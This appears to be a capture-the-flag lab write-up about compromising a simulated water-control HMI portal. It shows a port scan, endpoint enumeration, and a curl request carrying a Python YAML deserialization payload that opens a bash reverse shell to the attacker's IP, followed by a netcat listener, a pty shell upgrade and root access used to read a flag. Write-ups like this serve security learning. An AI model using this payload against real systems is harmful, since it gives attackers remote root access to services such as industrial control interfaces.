```Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

After the notorious malware strike on the Virelia Water Control Facility, phantom alerts and erratic sensor readings plague a system that was supposed to be fully remediated.

As a Black Echo red-team specialist, you must penetrate the compromised portal, unravel its hidden persistence mechanism, and neutralise the backdoor before it can be reactivated.  
  
You can access the portal via `http://10.10.166.93:8080`

**Note:** The VM takes about **3 minutes** to boot up.
```

`IP-Address` = `10.10.166.93`

Initiate `Rustscan` and result 
```bash 
rustscan -a 10.10.166.93
22   - SSH
80   - HTTP (redirects)
8080 - Main HMI interface
```

After Visiting `http://10.10.166.93:8080`
### Endpoints Discovered:
- `/dashboard` — lists fake PLCs
- `/telemetry` — sensor data
- `/config/update` — accepts YAML upload
- `/logs/view?name=debug.log` — shows system logs

`Dashboard` Reveals 
```Dashboard 
PLC Dashboard
ID	IP	Last Loader Log
PLC-101 	192.168.10.11 	2025-06-28T05:55:15 Config loader started
PLC-102 	192.168.10.12 	2025-06-28T05:55:15 Config loader started
```

`Logs: debug.Logs` Reveals
```debug.Logs
2025-06-28T05:24:08 STARTUP CONFIG: {'SIGNATURE': '[signature omitted]', 'PLCS': [{'id': 'PLC-101', 'ip': '192.168.10.11'}, {'id': 'PLC-102', 'ip': '192.168.10.12'}], 'SENSORS': [{'name': 'FlowRate', 'unit': 'L/s'}, {'name': 'Pressure', 'unit': 'bar'}]}
2025-06-28T05:24:08 DEBUG: loader script at /opt/hmi/update.py
2025-06-28T05:24:08 DEBUG: webapp script at /opt/hmi/app.py
```

```This tells us:
- The backend expects a YAML configuration
- It **requires a specific `SIGNATURE`**
- It uses a script located at `/opt/hmi/update.py`
```

`Config/Update` Reveals 
```Config/Update
Update Configuration
Paste your YAML below: YAML Configuration
```

## 💣 The Exploit: Python YAML Deserialization
YAML deserialization is extremely dangerous if the backend uses Python's `yaml.load()` (instead of `safe_load()`), because it can execute arbitrary Python objects.
Python's YAML module allows the injection of **unsafe tags** like this:
`!!python/object/apply:os.system ["COMMAND"]`
after trying multiple on Browser Find a way to inject and got root using `cURL`
```bash
curl -X POST http://10.10.166.93:8080/config/update \
  -H "Content-Type: application/x-yaml" \
  -H "X-FTW: [signature omitted]" \
  -d '!!python/object/apply:os.system ["bash -c \"bash -i >& /dev/tcp/10.10.215.133/4444 0>&1\""]' \
  -v
```

### How it works:

| Part                                                    | Description                                                      |
| ------------------------------------------------------- | ---------------------------------------------------------------- |
| `curl -X POST`                                          | Makes a POST request to the vulnerable endpoint                  |
| `-H "Content-Type: application/x-yaml"`                 | Tells the server we're uploading raw YAML                        |
| `-H "X-FTW: [signature omitted]"`                         | Custom header (we later learned this was **not required**)       |
| `-d '!!python/object/apply:os.system [...]'`            | YAML payload that triggers code execution                        |
| `os.system(...)`                                        | Executes a reverse shell command to connect back to our listener |
| `bash -c 'bash -i >& /dev/tcp/10.10.215.133/4444 0>&1'` | Sends a full bash shell over TCP                                 |
| `-v`                                                    | Verbose output to confirm it worked                              |
### 📡 Listener on Attacker Machine
Set up before sending the payload:

```bash
nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.166.93 41386
bash: cannot set terminal process group (596): Inappropriate ioctl for device
bash: no job control in this shell
root@tryhackme-2404:
```

#python_Spawn_stable1
`python3 -c 'import pty; pty.spawn("/bin/bash")'` 

```bash 
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
root@tryhackme-2404:/opt/hmi# python3 -c 'import pty; pty.spawn("/bin/bash")'
ash")'3 -c 'import pty; pty.spawn("/bin/b python3 -c 'import pty; pty.spawn("/bin/bash")'

root@tryhackme-2404:/opt/hmi# ls
ls
__pycache__  config.yaml      logs    templates  uploads
app.py	     flag1402309.txt  static  update.py  venv
root@tryhackme-2404:/opt/hmi# cat fl	
cat flag1402309.txt 
[flag omitted]
root@tryhackme-2404:/opt/hmi# 
```

Got Flag 
```Flag 
[flag omitted]
```



WOrobot

``````bash 
curl -X POST http://10.10.166.93:8080/config/update -H "Content-Type: application/x-yaml" -H "X-FTW: [signature omitted]" -d '!!python/object/apply:os.system ["bash -c \"bash -i >& /dev/tcp/10.10.138.204/4444 0>&1\""]' -v
```